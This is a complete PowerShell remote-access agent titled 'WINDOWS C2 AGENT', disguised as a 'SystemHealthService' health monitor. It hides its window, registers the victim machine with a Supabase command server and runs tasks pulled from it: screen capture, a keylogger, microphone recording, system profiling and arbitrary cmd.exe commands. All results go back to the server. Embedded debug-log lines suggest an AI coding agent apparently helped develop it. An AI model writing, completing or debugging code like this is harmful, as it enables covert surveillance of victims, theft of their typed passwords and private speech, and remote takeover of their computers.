# ================================
# WINDOWS C2 AGENT - FORMATTED
# ================================

# Suppress errors and progress bars
$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"

# Hide console window
try {
    Add-Type -Name Window -Namespace Native -MemberDefinition '[DllImport("Kernel32.dll")]public static extern IntPtr GetConsoleWindow();[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr h,Int32 n);'
    [Native.Window]::ShowWindow([Native.Window]::GetConsoleWindow(), 0)
} catch {}

# ================================
# CONFIGURATION
# ================================

$basePath = "C:\ProgramData\SystemHealthService"
$keylogFile = "$basePath\kb.tmp"
$keyloggerStateFile = "$basePath\keylogger_state.json"

# Wait for internet connection
while (!(Test-Connection -ComputerName "8.8.8.8" -Count 1 -Quiet)) {
    Start-Sleep 5
}
Start-Sleep 5

# Load config
$config = Get-Content "$basePath\config.json" -Raw | ConvertFrom-Json
$deviceIdFile = "$basePath\device_id.txt"

# Get or create device ID
if (Test-Path $deviceIdFile) {
    $deviceId = (Get-Content $deviceIdFile -Raw).Trim()
} else {
    $deviceId = [guid]::NewGuid().ToString()
    $deviceId | Out-File $deviceIdFile -NoNewline
    (Get-Item $deviceIdFile).Attributes = "Hidden"
}

# Generate random device name (8 chars)
$deviceName = -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object { [char]$_ })

# ================================
# API HELPER FUNCTION
# ================================

$headers = @{
    "apikey" = $config.supabase_key
    "Authorization" = "Bearer $($config.supabase_key)"
    "Content-Type" = "application/json"
    "Prefer" = "return=minimal"
}

function Invoke-API {
    param(
        $endpoint,
        $method = "GET",
        $body = $null
    )
    
    $uri = "$($config.supabase_url)/rest/v1/$endpoint"
    
    try {
        #region agent log
        $logPath = "c:\Users\moaya\OneDrive\Documents\ok\.cursor\debug.log"; @{sessionId='debug-session';runId='run1';hypothesisId='H9';location='HealthMonitor.ps1:55';message='API call start';data=@{endpoint=$endpoint;method=$method}} | ConvertTo-Json -Compress | Add-Content $logPath
        #endregion
        
        $result = $null
        if ($body) {
            $result = Invoke-RestMethod -Uri $uri -Method $method -Headers $headers -Body ($body | ConvertTo-Json -Depth 10 -Compress) -TimeoutSec 10
        } else {
            $result = Invoke-RestMethod -Uri $uri -Method $method -Headers $headers -TimeoutSec 10
        }
        
        #region agent log
        @{sessionId='debug-session';runId='run1';hypothesisId='H9';location='HealthMonitor.ps1:70';message='API call success';data=@{endpoint=$endpoint;method=$method;hasResult=($null -ne $result)}} | ConvertTo-Json -Compress | Add-Content $logPath
        #endregion
        
        return $result
    } catch {
        #region agent log
        @{sessionId='debug-session';runId='run1';hypothesisId='H9';location='HealthMonitor.ps1:72';message='API call error';data=@{endpoint=$endpoint;method=$method;error=$_.Exception.Message}} | ConvertTo-Json -Compress | Add-Content $logPath
        #endregion
        return $null
    }
}

# ================================
# REGISTER DEVICE
# ================================

$registrationData = @{
    device_id = $deviceId
    device_name = $deviceName
    hostname = $env:COMPUTERNAME
    username = $env:USERNAME
    os_info = (Get-CimInstance Win32_OperatingSystem).Caption
}

Invoke-API -endpoint "devices" -method "POST" -body $registrationData

# ================================
# TASK FUNCTIONS
# ================================

# Screenshot Capture
function Capture-Screenshot {
    try {
        Add-Type -AssemblyName System.Windows.Forms, System.Drawing
        
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        
        $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
        
        $memoryStream = New-Object System.IO.MemoryStream
        $bitmap.Save($memoryStream, [System.Drawing.Imaging.ImageFormat]::Png)
        $base64 = [Convert]::ToBase64String($memoryStream.ToArray())
        
        $graphics.Dispose()
        $bitmap.Dispose()
        $memoryStream.Dispose()
        
        return @{
            data_type = "display"
            file_data = $base64
        }
    } catch {
        return @{
            data_type = "display"
            data = "Failed"
        }
    }
}

# Keylogger Function - NON-BLOCKING VERSION
function Start-Keylogger {
    param($duration = 60, $taskId = $null)
    
    #region agent log
    $logPath = "c:\Users\moaya\OneDrive\Documents\ok\.cursor\debug.log"; @{sessionId='debug-session';runId='run1';hypothesisId='H10';location='HealthMonitor.ps1:139';message='Start-Keylogger entry';data=@{duration=$duration;taskId=$taskId}} | ConvertTo-Json -Compress | Add-Content $logPath
    #endregion
    
    try {
        # Load required assemblies
        Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop
        
        # Import GetAsyncKeyState API - check if type already exists first
        $typeExists = $false
        try {
            $testType = [User.KeyState]
            $typeExists = $true
        } catch {
            $typeExists = $false
        }
        
        if (-not $typeExists) {
            Add-Type -MemberDefinition '[DllImport("user32.dll")]public static extern short GetAsyncKeyState(int v);' -Name KeyState -Namespace User -ErrorAction Stop
        }
        
        # Verify the type is usable
        try {
            $testResult = [User.KeyState]::GetAsyncKeyState(0)
            $typeUsable = $true
        } catch {
            $typeUsable = $false
            throw "GetAsyncKeyState type not usable: $_"
        }
        
        # Initialize state
        $state = @{
            taskId = $taskId
            startTime = (Get-Date).ToString('o')
            endTime = (Get-Date).AddSeconds($duration).ToString('o')
            duration = $duration
            isActive = $true
        }
        $state | ConvertTo-Json | Out-File $keyloggerStateFile -NoNewline
        
        # Clear keylog file
        "" | Out-File $keylogFile -NoNewline
        
        #region agent log
        @{sessionId='debug-session';runId='run1';hypothesisId='H10';location='HealthMonitor.ps1:175';message='Keylogger started';data=@{typeUsable=$typeUsable;endTime=$state.endTime}} | ConvertTo-Json -Compress | Add-Content $logPath
        #endregion
        
        return $true
    } catch {
        #region agent log
        @{sessionId='debug-session';runId='run1';hypothesisId='H10';location='HealthMonitor.ps1:180';message='Start-Keylogger error';data=@{error=$_.Exception.Message}} | ConvertTo-Json -Compress | Add-Content $logPath
        #endregion
        return $false
    }
}

# Process keylogger in small chunks (non-blocking)
function Process-Keylogger {
    #region agent log
    $logPath = "c:\Users\moaya\OneDrive\Documents\ok\.cursor\debug.log"
    #endregion
    
    # Check if keylogger is active
    if (-not (Test-Path $keyloggerStateFile)) {
        return $null
    }
    
    try {
        $state = Get-Content $keyloggerStateFile -Raw | ConvertFrom-Json
        $endTime = [DateTime]::Parse($state.endTime)
        $currentTime = Get-Date
        
        # Check if keylogger should still be running
        if ($currentTime -ge $endTime) {
            # Keylogger duration expired - read results and clean up
            $keystrokeData = Get-Content $keylogFile -Raw -EA SilentlyContinue
            Remove-Item $keylogFile -Force -EA SilentlyContinue
            Remove-Item $keyloggerStateFile -Force -EA SilentlyContinue
            
            #region agent log
            @{sessionId='debug-session';runId='run1';hypothesisId='H10';location='HealthMonitor.ps1:200';message='Keylogger completed';data=@{taskId=$state.taskId;dataLength=if($keystrokeData){$keystrokeData.Length}else{0}}} | ConvertTo-Json -Compress | Add-Content $logPath
            #endregion
            
            if ($keystrokeData) {
                return @{
                    taskId = $state.taskId
                    data_type = "input"
                    data = $keystrokeData
                }
            } else {
                return @{
                    taskId = $state.taskId
                    data_type = "input"
                    data = "[No keystrokes recorded]"
                }
            }
        }
        
        # Keylogger still active - capture keys for this chunk (1 second max)
        $chunkEndTime = (Get-Date).AddSeconds(1)
        $keysCaptured = @()
        
        # Check only commonly used keys (reduced set for lower CPU)
        $keyCodes = @(32, 48..57, 65..90, 186, 187, 188, 189, 190, 191, 192, 219, 220, 221, 222)
        
        while ((Get-Date) -lt $chunkEndTime -and (Get-Date) -lt $endTime) {
            foreach ($virtualKey in $keyCodes) {
                try {
                    $keyState = [User.KeyState]::GetAsyncKeyState($virtualKey)
                    if ($keyState -eq -32767) {
                        $keysCaptured += [System.Windows.Forms.Keys]$virtualKey
                    }
                } catch {
                    # Silently continue on errors
                }
            }
            Start-Sleep -Milliseconds 50
        }
        
        # Append captured keys to file
        if ($keysCaptured.Count -gt 0) {
            Add-Content $keylogFile ($keysCaptured -join " ") -NoNewline -ErrorAction SilentlyContinue
        }
        
        return $null  # Still running
    } catch {
        #region agent log
        @{sessionId='debug-session';runId='run1';hypothesisId='H10';location='HealthMonitor.ps1:240';message='Process-Keylogger error';data=@{error=$_.Exception.Message}} | ConvertTo-Json -Compress | Add-Content $logPath
        #endregion
        return $null
    }
}

# System Info
function Get-SystemInfo {
    try {
        $os = Get-CimInstance Win32_OperatingSystem
        $computer = Get-CimInstance Win32_ComputerSystem
        
        $info = @{
            hostname = $env:COMPUTERNAME
            username = $env:USERNAME
            os = $os.Caption
            os_version = $os.Version
            manufacturer = $computer.Manufacturer
            model = $computer.Model
            memory_gb = [math]::Round($computer.TotalPhysicalMemory / 1GB, 2)
        }
        
        return @{
            data_type = "sysinfo"
            data = ($info | ConvertTo-Json -Compress)
        }
    } catch {
        $null
    }
}

# Audio Recording
function Record-Audio {
    param($duration = 10)
    
    try {
        $audioFile = "$basePath\rec.wav"
        
        # Define MCI commands
        Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class AudioRecorder{[DllImport("winmm.dll",EntryPoint="mciSendStringA")]public static extern int mciSendString(string command,string buffer,int bufferSize,IntPtr hwndCallback);}' -Language CSharp -EA SilentlyContinue
        
        # Start recording
        [AudioRecorder]::mciSendString("open new Type waveaudio Alias recorder", "", 0, [IntPtr]::Zero)
        [AudioRecorder]::mciSendString("set recorder bitspersample 16", "", 0, [IntPtr]::Zero)
        [AudioRecorder]::mciSendString("set recorder samplespersec 22050", "", 0, [IntPtr]::Zero)
        [AudioRecorder]::mciSendString("set recorder channels 1", "", 0, [IntPtr]::Zero)
        [AudioRecorder]::mciSendString("record recorder", "", 0, [IntPtr]::Zero)
        
        # Wait for duration
        Start-Sleep $duration
        
        # Stop and save
        [AudioRecorder]::mciSendString("stop recorder", "", 0, [IntPtr]::Zero)
        [AudioRecorder]::mciSendString("save recorder `"$audioFile`"", "", 0, [IntPtr]::Zero)
        [AudioRecorder]::mciSendString("close recorder", "", 0, [IntPtr]::Zero)
        
        # Read and encode audio file
        if (Test-Path $audioFile) {
            $audioBytes = [System.IO.File]::ReadAllBytes($audioFile)
            $base64 = [Convert]::ToBase64String($audioBytes)
            Remove-Item $audioFile -Force -EA SilentlyContinue
            
            return @{
                data_type = "audio"
                file_data = $base64
            }
        } else {
            return @{
                data_type = "audio"
                data = "Failed"
            }
        }
    } catch {
        return @{
            data_type = "audio"
            data = "$_"
        }
    }
}

# Command Execution
function Execute-Command {
    param($cmd)
    
    try {
        $processInfo = New-Object System.Diagnostics.ProcessStartInfo
        $processInfo.FileName = "cmd.exe"
        $processInfo.Arguments = "/c $cmd"
        $processInfo.RedirectStandardOutput = $true
        $processInfo.RedirectStandardError = $true
        $processInfo.UseShellExecute = $false
        $processInfo.CreateNoWindow = $true
        
        $process = New-Object System.Diagnostics.Process
        $process.StartInfo = $processInfo
        $process.Start() | Out-Null
        
        $output = $process.StandardOutput.ReadToEnd()
        $errorOutput = $process.StandardError.ReadToEnd()
        $process.WaitForExit(30000)
        
        $result = @{
            command = $cmd
            output = $output
            error = $errorOutput
            exit_code = $process.ExitCode
        }
        
        return @{
            data_type = "cmd_result"
            data = ($result | ConvertTo-Json -Compress)
        }
    } catch {
        $result = @{
            command = $cmd
            error = "$_"
        }
        
        return @{
            data_type = "cmd_result"
            data = ($result | ConvertTo-Json -Compress)
        }
    }
}

# ================================
# MAIN LOOP
# ================================

# Set sync intervals (default 10 seconds)
$syncInterval = if ($config.sync_interval) { $config.sync_interval } else { 10 }
$retryInterval = if ($config.retry_interval) { $config.retry_interval } else { 10 }

while ($true) {
    try {
        # Process active keylogger in chunks (non-blocking)
        $keyloggerResult = Process-Keylogger
        if ($keyloggerResult) {
            # Keylogger completed - send results
            $telemetryData = @{
                device_id = $deviceId
                data_type = $keyloggerResult.data_type
                data = $keyloggerResult.data
            }
            Invoke-API -endpoint "telemetry" -method "POST" -body $telemetryData | Out-Null
            Invoke-API -endpoint "tasks?id=eq.$($keyloggerResult.taskId)" -method "PATCH" -body @{
                status = "complete"
                completed_at = (Get-Date -Format "o")
            } | Out-Null
        }
        
        # Update last sync time
        Invoke-API -endpoint "devices?device_id=eq.$deviceId" -method "PATCH" -body @{ last_sync = (Get-Date -Format "o") } | Out-Null
        
        # Get pending tasks
        $tasks = Invoke-API -endpoint "tasks?device_id=eq.$deviceId&status=eq.pending&select=id,task_type,task_params"
        
        if ($tasks) {
            # Ensure tasks is an array
            if ($tasks -isnot [array]) {
                $tasks = @($tasks)
            }
            
            # Process each task
            foreach ($task in $tasks) {
                # Mark task as processing
                Invoke-API -endpoint "tasks?id=eq.$($task.id)" -method "PATCH" -body @{ status = "processing" } | Out-Null
                
                $taskResult = $null
                
                # Execute based on task type
                switch ($task.task_type) {
                    "display_capture" {
                        $taskResult = Capture-Screenshot
                    }
                    
                    "input_monitor" {
                        #region agent log
                        $logPath = "c:\Users\moaya\OneDrive\Documents\ok\.cursor\debug.log"; @{sessionId='debug-session';runId='run1';hypothesisId='H10';location='HealthMonitor.ps1:430';message='Starting input_monitor task';data=@{taskId=$task.id}} | ConvertTo-Json -Compress | Add-Content $logPath
                        #endregion
                        $duration = 60
                        if ($task.task_params -and $task.task_params.duration) {
                            $duration = [int]$task.task_params.duration
                        }
                        # Start non-blocking keylogger
                        $started = Start-Keylogger -duration $duration -taskId $task.id
                        if ($started) {
                            # Keylogger started - will be processed in chunks, don't mark complete yet
                            $taskResult = $null
                        } else {
                            $taskResult = @{
                                data_type = "input"
                                data = "Error: Failed to start keylogger"
                            }
                        }
                    }
                    
                    "system_info" {
                        $taskResult = Get-SystemInfo
                    }
                    
                    "voice_capture" {
                        $duration = 10
                        if ($task.task_params -and $task.task_params.duration) {
                            $duration = [int]$task.task_params.duration
                        }
                        $taskResult = Record-Audio -duration $duration
                    }
                    
                    "cmd_exec" {
                        $command = ""
                        if ($task.task_params -and $task.task_params.command) {
                            $command = $task.task_params.command
                        }
                        
                        if ($command) {
                            $taskResult = Execute-Command -cmd $command
                        } else {
                            $taskResult = @{
                                data_type = "cmd_result"
                                data = "No command"
                            }
                        }
                    }
                }
                
                # Save results to telemetry
                #region agent log
                $logPath = "c:\Users\moaya\OneDrive\Documents\ok\.cursor\debug.log"; @{sessionId='debug-session';runId='run1';hypothesisId='H1,H2,H3,H4,H5';location='HealthMonitor.ps1:373';message='Task result check';data=@{taskId=$task.id;hasResult=($null -ne $taskResult);taskType=$task.task_type}} | ConvertTo-Json -Compress | Add-Content $logPath
                #endregion
                if ($taskResult) {
                    $telemetryData = @{
                        device_id = $deviceId
                        data_type = $taskResult.data_type
                    }
                    
                    if ($taskResult.file_data) {
                        $telemetryData.file_data = $taskResult.file_data
                    }
                    
                    if ($taskResult.data) {
                        $telemetryData.data = $taskResult.data
                    }
                    
                    # Insert into telemetry table
                    #region agent log
                    $logPath = "c:\Users\moaya\OneDrive\Documents\ok\.cursor\debug.log"; @{sessionId='debug-session';runId='run1';hypothesisId='H6';location='HealthMonitor.ps1:484';message='Sending telemetry';data=@{taskId=$task.id}} | ConvertTo-Json -Compress | Add-Content $logPath
                    #endregion
                    $telemetryResult = Invoke-API -endpoint "telemetry" -method "POST" -body $telemetryData
                    #region agent log
                    @{sessionId='debug-session';runId='run1';hypothesisId='H6';location='HealthMonitor.ps1:484';message='Telemetry result';data=@{taskId=$task.id;success=($null -ne $telemetryResult)}} | ConvertTo-Json -Compress | Add-Content $logPath
                    #endregion
                    
                    # Mark task as complete
                    #region agent log
                    @{sessionId='debug-session';runId='run1';hypothesisId='H6';location='HealthMonitor.ps1:487';message='Updating task status to complete';data=@{taskId=$task.id}} | ConvertTo-Json -Compress | Add-Content $logPath
                    #endregion
                    $statusUpdateResult = Invoke-API -endpoint "tasks?id=eq.$($task.id)" -method "PATCH" -body @{
                        status = "complete"
                        completed_at = (Get-Date -Format "o")
                    }
                    #region agent log
                    @{sessionId='debug-session';runId='run1';hypothesisId='H6';location='HealthMonitor.ps1:490';message='Task status update result';data=@{taskId=$task.id;success=($null -ne $statusUpdateResult)}} | ConvertTo-Json -Compress | Add-Content $logPath
                    #endregion
                }
            }
        }
        
        Start-Sleep $syncInterval
        
    } catch {
        Start-Sleep $retryInterval
    }
}
